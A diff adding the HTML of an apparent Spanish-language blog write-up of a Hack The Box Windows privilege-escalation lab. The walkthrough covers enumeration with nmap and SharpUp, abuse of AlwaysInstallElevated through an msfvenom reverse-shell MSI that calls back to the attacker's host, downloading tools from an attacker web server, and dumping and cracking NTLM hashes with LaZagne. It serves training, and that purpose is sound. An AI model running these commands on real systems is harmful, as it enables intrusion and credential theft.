@@ -1,0 +1,468 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><title>
+    
+    Laboratorio De Escalada De Privilegios Locales en Windows - Parte 2 | 
+    
+    CHL Blog
+</title>
+
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<link rel="canonical" href="http://localhost:1313/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-escalada-de-privilegios-locales-en-windows---parte-2/" />
+<link rel="icon" type="image/png" href="http://localhost:1313/image/favicon.ico">
+
+
+<meta name="description" content="
+    En este laboratorio realizamos una evaluación de escalada de privilegios sobre una imagen Windows 10 estándar. Identificamos una política que permitió ejecutar paquetes como SYSTEM. Con privilegios elevados recuperamos y deciframos credenciales locales (hash NTLM) de uno de los administradores.
+    "
+/>
+<meta property="og:description" content="
+    En este laboratorio realizamos una evaluación de escalada de privilegios sobre una imagen Windows 10 estándar. Identificamos una política que permitió ejecutar paquetes como SYSTEM. Con privilegios elevados recuperamos y deciframos credenciales locales (hash NTLM) de uno de los administradores.
+    " 
+/>
+
+
+
+
+<meta property="og:title" content="Laboratorio de Escalada de Privilegios locales en Windows - Parte 2" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/pagina_web/blog/write-ups/htb/m%C3%B3dulos/laboratorio-de-escalada-de-privilegios-locales-en-windows---parte-2/" /><meta property="article:section" content="pagina_web" />
+<meta property="article:published_time" content="2025-11-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2025-11-08T00:00:00+00:00" />
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Laboratorio de Escalada de Privilegios locales en Windows - Parte 2">
+  <meta name="twitter:description" content="En este laboratorio realizamos una evaluación de escalada de privilegios sobre una imagen Windows 10 estándar. Identificamos una política que permitió ejecutar paquetes como SYSTEM. Con privilegios elevados recuperamos y deciframos credenciales locales (hash NTLM) de uno de los administradores.">
+
+
+  <meta itemprop="name" content="Laboratorio de Escalada de Privilegios locales en Windows - Parte 2">
+  <meta itemprop="description" content="En este laboratorio realizamos una evaluación de escalada de privilegios sobre una imagen Windows 10 estándar. Identificamos una política que permitió ejecutar paquetes como SYSTEM. Con privilegios elevados recuperamos y deciframos credenciales locales (hash NTLM) de uno de los administradores.">
+  <meta itemprop="datePublished" content="2025-11-08T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-11-08T00:00:00+00:00">
+  <meta itemprop="wordCount" content="835">
+  <meta itemprop="keywords" content="Hackthebox,Windows,Privilege-Escalation,Sharpup,AlwaysInstallElevated">
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/main.min.css">
+
+
+
+
+
+<script src="http://localhost:1313/bundle.js"></script>
+
+
+
+
+
+
+
+<script data-ad-client="adsense-key" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
+
+
+
+
+
+
+
+
+</head>
+
+<body><header id="header">
+  <div class="top-bar">
+    <div class="container-md">
+
+      <div class="row align-items-center">
+        <div class="col-3 col-sm-4 social-buttons d-none d-sm-block">
+          <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+        </div>
+
+        <div class="ra-toggler col-3 col-sm-4 d-block d-sm-none">
+          <button class="bg-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+            <i class="fas fa-bars"></i>
+          </button>
+        </div>
+
+        <div class="col-6 col-sm-4">
+          <h2 class="title"><a href="http://localhost:1313/">CHL Blog</a></h2>
+        </div>
+
+        
+        <div class="col-3 col-sm-4">
+          <div class="col col-md-8 offset-md-4 d-none d-sm-block">
+            <form id="cse-search-box-form-id" class="input-group search-bar" onsubmit="return executeQuery('lg');"
+              role="search">
+              <input id="cse-search-input-box-id" type="text" class="form-control" placeholder="Search">
+              <button class="btn" type="submit">
+                <i class="fa fa-search"></i>
+              </button>
+            </form>
+          </div>
+        </div>
+        
+
+      </div>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <nav class="navbar navbar-expand-sm navbar-dark bg-dark sticky-top">
+      <div class="collapse navbar-collapse" id="navbarNav">
+        <ul class="navbar-nav mx-auto">
+
+          <li class="nav-item d-block d-sm-none">
+            <ul class="social-buttons">
+              <ul>
+    
+    
+
+    
+    <li>
+        <a href="https://www.youtube.com/@CHL_Hands_On" target="_blank">
+            <i class="fab fa-youtube"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://www.instagram.com/19chl96/" target="_blank">
+            <i class="fab fa-instagram"></i></a>
+    </li>
+    
+
+    
+    <li>
+        <a href="https://github.com/chernadez321" target="_blank">
+            <i class="fab fa-github"></i></a>
+    </li>
+    
+
+    
+
+    
+    <li>
+        <a href="https://www.linkedin.com/in/chlinked/" target="_blank">
+            <i class="fab fa-linkedin"></i></a>
+    </li>
+    
+
+</ul>
+            </ul>
+          </li>
+
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="http://localhost:1313/">
+              Home
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item dropdown">
+            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-bs-toggle="dropdown">
+              Blog
+            </a>
+            <div class="dropdown-menu">
+              
+              
+                <a class="dropdown-item" href="http://localhost:1313/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+              
+              
+              
+                <a class="dropdown-item" href="http://localhost:1313/pagina_web/blog/write-ups/">Write-ups</a>
+              
+              
+              
+                <div class="dropdown-divider"></div>
+              
+              
+              
+                <a class="dropdown-item" href="http://localhost:1313/tags/">Búsqueda por etiquetas</a>
+              
+              
+            </div>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="http://localhost:1313/pagina_web/trayectoria/">
+              Trayectoria
+            </a>
+          </li>
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link 
+              
+              " 
+              href="http://localhost:1313/pagina_web/contact/">
+              Contacto
+            </a>
+          </li>
+          
+          
+        </ul>
+
+        
+        <form id="cse-search-box-form-id2" class="d-flex search-bar d-block d-sm-none"
+          onsubmit="return executeQuery('xs');" role="search">
+          <input id="cse-search-input-box-id2" type="text" class="form-control" placeholder="Search">
+          <button class="btn" type="submit">
+            <i class="fa fa-search"></i>
+          </button>
+        </form>
+        
+
+      </div>
+    </nav>
+  </div>
+</header>
+
+<main class="blog-content">
+    <div class="container-md">
+        <div class="row">
+            
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-left-offset"></div>
+                
+            </div>
+
+            <div class="col-md-12 col-lg-8 px-lg-4">
+                
+
+                <h1 class="title">Laboratorio de Escalada de Privilegios locales en Windows - Parte 2</h1>
+
+                <div class="container-fluid px-0 mb-4">
+                    <div class="row align-items-end">
+                        <div class="col-md-4 date-time">
+                            <span class="date">
+    Nov 8, 2025
+</span>
+                            &centerdot;
+                            <span class="time-to-read">
+    5 mins read</span>
+                        </div>
+
+                        <div class="col-md-8 tags ">
+                            
+                            <a href="http://localhost:1313/tags/hackthebox"><span
+                                    class="tag bg-dark">hackthebox</span></a>
+                            
+                            <a href="http://localhost:1313/tags/windows"><span
+                                    class="tag bg-dark">windows</span></a>
+                            
+                            <a href="http://localhost:1313/tags/privilege-escalation"><span
+                                    class="tag bg-dark">privilege-escalation</span></a>
+                            
+                            <a href="http://localhost:1313/tags/sharpup"><span
+                                    class="tag bg-dark">sharpup</span></a>
+                            
+                            <a href="http://localhost:1313/tags/alwaysinstallelevated"><span
+                                    class="tag bg-dark">AlwaysInstallElevated</span></a>
+                            
+                        </div>
+                    </div>
+                </div>
+
+                
+
+                <p><img src="../../../../../images/Miniaturas/linux_priv_esc.png" alt=""></p>
+<h4 id="enunciado">Enunciado</h4>
+<p>Como complemento a su prueba de penetración anual, <code>INLANEFREIGHT</code> le ha solicitado que realice una revisión de seguridad de su imagen estándar de Windows 10, actualmente en uso por más de 1200 empleados en todo el mundo. El nuevo CISO está preocupado porque no se siguieron las mejores prácticas al establecer la imagen base y porque podría haber uno o más vectores de escalada de privilegios locales en la compilación. Ante todo, el CISO desea proteger la infraestructura interna de la empresa, asegurándose de que un atacante que logre acceder a una estación de trabajo (mediante un ataque de phishing, por ejemplo) no pueda escalar privilegios ni utilizar ese acceso para moverse lateralmente por la red. Debido a requisitos normativos, los empleados de <code>INLANEFREIGHT</code> no tienen privilegios de administrador local en sus estaciones de trabajo.</p>
+<p>Se le ha concedido una cuenta de usuario estándar con acceso RDP a una réplica de una estación de trabajo Windows 10 estándar sin acceso a internet. El cliente desea una evaluación lo más exhaustiva posible (es probable que contrate a su empresa para probar o intentar eludir los controles EDR en el futuro); por lo tanto, Defender se ha deshabilitado. Debido a las normativas vigentes, no pueden permitir el acceso a internet al equipo, por lo que deberá transferir usted mismo las herramientas necesarias.</p>
+<p>Enumera completamente el host e intenta escalar privilegios hasta obtener acceso de nivel administrador/SYSTEM.</p>
+<p>Empezamos con el reconocimiento inicial de la máquina haciendo escaneos para ver que puertos y servicios están corriendo</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- -sS --min-rate <span style="color:#ae81ff">1000</span> -n -Pn &lt;IP&gt; -oN scan1.txt
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_1-1.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p135,139,445,3389,5040,7680 -sCV -n -Pn 10.129.117.106 -oN scan2.txt
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_1-2.png" alt=""></p>
+<p><strong>Encuentre las credenciales en texto plano que quedaron sin usar para la cuenta de administrador de dominio <code>iamtheadministrator</code>.</strong>
+Dado que nuestra primera flag es encontrar credenciales en texto plano luego de conectarnos vamos a utilizar el comando <code>findstr</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>findstr /SIM /C:<span style="color:#e6db74">&#34;iamtheadministrator&#34;</span> C:\*.* <span style="color:#ae81ff">2</span>&gt;/null
+</span></span></code></pre></div><p>Lo que vamos a hacer aquí es buscar todas las coincidencias con la cadena <code>iamtheadministrator</code> en la particion <code>C:\</code> y nos redirigimos los errores de permisos a null para que no nos salgan en pantalla.
+<img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_1-3.png" alt="">
+Vemos que tenemos 2 archivos, uno es el <code>ConsoleHost_history.txt</code> que revisando la coincidencia es básicamente el propio comando que acabamos de escribir y el otro archivo es este:
+<img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_1-4.png" alt=""></p>
+<p><strong>Eleve los privilegios a SYSTEM y envíe el contenido del archivo flag.txt desde el escritorio del administrador.</strong>
+Seguimos analizando la máquina y, apoyándonos en la herramienta <a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe">SharpUp.exe</a>, la descargamos en nuestra máquina de trabajo y la copiamos a la víctima. Para servir el binario desde nuestro equipo local ejecutamos un servidor web simple con Python:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
+</span></span></code></pre></div><p>Y en la víctima la descargamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://&lt;Nuestra_IP&gt;:8000/SharpUp.exe&#34;</span> -OutFile ./SharpUp.exe
+</span></span></code></pre></div><p>Al ejecutar <code>SharpUp.exe</code> obtenemos el siguiente resultado: los registros <code>HKCU</code> y <code>HKLM</code> aparecen con valor <code>1</code>. Esto indica que la política <strong>AlwaysInstallElevated</strong> está habilitada tanto en el contexto de usuario (HKCU) como en el de sistema (HKLM).
+En otras palabras, el instalador de Windows (MSI) permite instalaciones elevadas desde la cuenta de usuario, lo que constituye un vector de escalada de privilegios (es posible ejecutar paquetes MSI con privilegios SYSTEM si se aprovecha correctamente).
+<img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_2-3.png" alt="">
+Al comprobarlos efectivamente están en 1.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span><span style="display:flex;"><span>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_2-4.png" alt="">
+Por lo que lo siguiente que vamos a hacer es un payload con extensión <code>.msi</code> para ejecutarlo en el servidor a ver si nos lo ejecuta con altos privilegios.
+En local:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;Nuestra_IP&gt; LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f msi &gt; shell.msi
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_2-5.png" alt="">
+Al igual que el <code>SharpUp.exe</code> nos copiamos  nuestra shell a la máquina víctima con nuestro servidor <code>python</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
+</span></span></code></pre></div><p>Y en la víctima la descargamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://&lt;Nuestra_IP&gt;:8000/shell.msi&#34;</span> -OutFile ./shell.msi
+</span></span></code></pre></div><p>Antes de ejecutarlo en la víctima nos ponemos en escucha por el puerto <code>4444</code>. Recomiendo utilizar la herramienta <a href="https://github.com/brightio/penelope/blob/main/penelope.py">penelope</a>.
+Ejecutamos la <code>shell</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>msiexec.exe /quiet /qn /i C:\Users\htb-student\Downloads\shell.msi
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_2-6.png" alt="">
+Y debemos haber capturado la sesión como <code>SYSTEM</code> .
+Ahora solo leemos la flag en el escritorio del Administrador.
+<img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_2-7.png" alt=""></p>
+<p><strong>En este sistema existe un usuario administrador local deshabilitado con una contraseña débil que podría utilizarse para acceder a otros sistemas de la red, por lo que conviene informar al cliente. Tras elevar los privilegios, obtenga el hash NTLM de este usuario y descífrelo sin conexión. Envíe la contraseña en texto plano de esta cuenta.</strong>
+Ya con privilegios de <code>SYSTEM</code> nos vamos a apoyar en la herramienta <a href="https://github.com/AlessandroZ/LaZagne/releases/">Lazagne.exe</a> donde nos va a lanzar los <code>hashes</code> de todos lo usuarios de la máquina.
+Nos la vamos  a descargar igual que el resto de herramientas y pasarla la máquina víctima. Nos apyamos de una sesión de htb-student para descargarnos la herramienta.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server
+</span></span></code></pre></div><p>Y en la víctima la descargamos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri <span style="color:#e6db74">&#34;http://&lt;Nuestra_IP&gt;:8000/LaZagne.exe&#34;</span> -OutFile ./Lazagne.exe
+</span></span></code></pre></div><p>Y luego en la reverse-shell que tenemos con privilegios de <code>SYSTEM</code> la ejecutamos.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Lazagne.exe all
+</span></span></code></pre></div><p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_3-1.png" alt="">
+Simplemente lo crackeamos y tenemos el password en texto plano. Te dejo la url <a href="https://crackstation.net/">Crackstation</a>.</p>
+<p><img src="../../../../../images/HTB_modulos/Windows_Privilege_Escalation_lab_2/flag_3-2.png" alt="">
+Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.</p>
+
+
+                <div id="social-media-share">
+	<p><i>Escríbeme por cualquiera de las vías</i></p>
+	
+	<div class="share-buttons">
+	    
+		<a href="https://www.instagram.com/19chl96/" 
+   			target="_blank" 
+   			title="Sígueme en Instagram">
+    		<img src=http://localhost:1313/icons/45px/instagram.png alt="Instagram">
+		</a>
+
+		<a  href="https://www.linkedin.com/in/chlinked/"
+	        onclick="socialMediaPopUp(this.href, '', 900, 500); return false;"
+	        title="Share on LinkedIn. Opens in a new window." >
+	        <img src=http://localhost:1313/icons/48px/linkedin.png>
+	    </a>
+
+	    <a href="https://mail.google.com/mail/?view=cm&fs=1&to=chlorenzo96@gmail.com&su=Para Carlos&body=Hola." 
+   		   target="_blank" 
+   		   title="Enviar correo usando Gmail">
+    	<img src=http://localhost:1313/icons/48px/email.png alt="Email">
+		</a>
+
+		
+
+	</div>
+</div>
+
+
+
+                
+                <br>
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    (function () {
+        
+        
+        if (window.location.hostname == "localhost")
+            return;
+
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = '';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+            </div>
+
+            <div class="col-lg-2 d-none d-xl-block">
+                <div class="ad-right-offset"></div>
+                
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="bg-dark text-light py-4">
+    <div class="container-md">
+        <div class="row justify-content-center">
+            <div class="col-12">
+                <nav class="navbar navbar-expand-sm navbar-dark bg-dark justify-content-center">
+                    <ul class="navbar-nav">
+                        <li class="nav-item">
+                            <a class="nav-link" href="http://localhost:1313/">Home</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="http://localhost:1313/pagina_web/blog/seguridad_para_todos/">Seguridad para todos</a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="http://localhost:1313/pagina_web/blog/write-ups/">Write-ups</a>
+                        </li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+    </div>
+    <div class="text-center mt-3">
+        <p>© 2025 Carlos Hernández Lorenzo</p>
+    </div>
+</footer>
+
+
+<script async src="https://cse.google.com/cse.js?cx=google-cse-key"></script>
+<gcse:searchresults-only></gcse:searchresults-only>
+
+</body>
+
+</html>
